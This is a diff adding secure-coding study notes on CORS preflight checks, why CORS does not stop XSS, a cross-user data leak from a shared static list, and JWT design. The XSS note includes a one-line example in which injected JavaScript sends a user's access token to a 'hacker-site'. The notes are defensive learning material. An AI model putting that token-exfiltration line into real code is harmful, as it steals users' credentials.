@@ -272,6 +272,26 @@ Secure Coding notes.txt
   - Use JWT instead of Cookies for authn, as they are not sent automatically by the browser to the server, but only when you explicitly add them in the header of your fetch/ajax calls.
   - SameSite=Lax (or Strict if you can) << RESEARCH
 
+=== CORS = Cross-Origin Resource Sharing
+  - You went international. Clients are on seven continents. 
+  - To display your web page faster in Australia, you rely on a content delivery network (CDN) to ship HTML, JavaScript, images, and CSS to your clients.
+  - For the .js of your page, it is loaded from cdn.bank.com.  
+  - That JavaScript attempts to do a JavaScript REST call with  fetch() against api.bank.com. 
+  - The course protection is implemented by browsers. 
+  - When the browser sees the fetch attempting to reach another domain, it would pause the call and, before allowing it to continue, do a preflight check with api.bank.com, asking it if it accepts JavaScript calls coming from cdn.bank.com.
+  doing a OPTION call to api.bank.com with Origin: cdn.bank.com 
+  
+
+Can CORS be used to prevent XSS? 
+XSS = hacker makes your browser execute 😈 js
+  ⇒ against the same application
+  ⇒ fetch("hacker-site?jwt_i_got="+yourAT)
+      hacker-site will accept any cors
+
+=== Data leakage beween users
+  - a website added transactions to a global static/ThreadLocal list? When Next Person logged on, that list of transactions just got added to, so then they could see your own transactions and the transaction from the person that looked at it before. 
+
+
 === JWT design
   - what payload
     a) role: "ADMIN" 😱for what app?
